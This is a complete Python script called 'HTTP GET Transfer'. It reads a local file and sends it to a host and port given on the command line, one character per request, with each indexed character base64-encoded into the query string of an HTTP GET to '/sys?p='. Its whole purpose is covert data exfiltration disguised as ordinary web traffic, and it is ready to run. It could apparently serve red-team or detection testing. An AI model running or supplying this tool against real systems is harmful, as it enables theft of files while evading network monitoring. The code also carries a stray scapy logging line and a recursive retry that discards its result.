#!/usr/bin/python
############################################################
# Requirements:
# pip install termcolor
############################################################

from termcolor import colored
import requests
import datetime
import argparse
import os
import time
import logging
import base64

# Disable scapy warning output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

NAME = "HTTP GET Transfer"
VERSION = "1.0"
DATE = "02/06/2024"


def parse_arguments():
    """Parse and return arguments from the command line."""
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-f",
        "--read-file",
        action="store",
        dest="read_file",
        required=True,
        help="File to send by HTTP Get.",
    )
    parser.add_argument(
        "-t",
        "--target-address",
        action="store",
        dest="target",
        required=True,
        help="Destination Address.",
    )
    parser.add_argument(
        "-p",
        "--target-port",
        action="store",
        dest="port",
        required=True,
        help="Destination Port.",
    )
    return parser.parse_args()


def print_banner():
    """Print the banner."""
    print("")
    print(f"### {NAME}")
    print(f"### Version {VERSION}")
    print(f"### Date {DATE}")
    print("### by Bruno Botelho - bruno.botelho.br@gmail.com")
    print("")


def log_timestamp():
    """Return the current timestamp."""
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def convert_bytes(num):
    """Convert bytes to KB, MB, GB, TB as needed."""
    for x in ["bytes", "KB", "MB", "GB", "TB"]:
        if num < 1024.0:
            return "%3.1f %s" % (num, x)
        num /= 1024.0


def file_size(file):
    """Return the file size."""
    if os.path.isfile(file):
        file_info = os.stat(file)
        return convert_bytes(file_info.st_size)


def do_get(a):
    """Do the HTTP Get request."""
    try:  # type: ignore
        return requests.get(a, timeout=5)  # type: ignore
    except:  # type: ignore
        time.sleep(1)  # type: ignore
        do_get(a)  # type: ignore


def main():
    """Main function."""
    args = parse_arguments()
    print_banner()

    file = open(args.read_file, "r")
    file_data = file.read()
    file.close()

    print("### " + log_timestamp() + " File to Transfer: " + str(args.read_file))
    print("### " + log_timestamp() + " File Size: " + str(file_size(args.read_file)))
    print("### " + log_timestamp() + " Destination Address: " + args.target)
    print("### " + log_timestamp() + " Destination Port: " + args.port)
    print("")

    i = 0

    for c in file_data:
        i = i + 1
        index = str(i) + "/" + str(len(file_data))
        index_c = c + "&&" + index
        index_c_bytes = index_c.encode("utf-8")  # Convert to bytes
        payload = base64.b64encode(index_c_bytes).decode("utf-8")
        url_get = "http://" + args.target + ":" + str(args.port) + "/sys?p=" + payload
        print(
            log_timestamp()
            + " Transfering: "
            + colored(index, "green")
            + " Get > "
            + colored(str(url_get).rstrip("\n"), "red")
        )
        do_get(url_get)


if __name__ == "__main__":
    main()
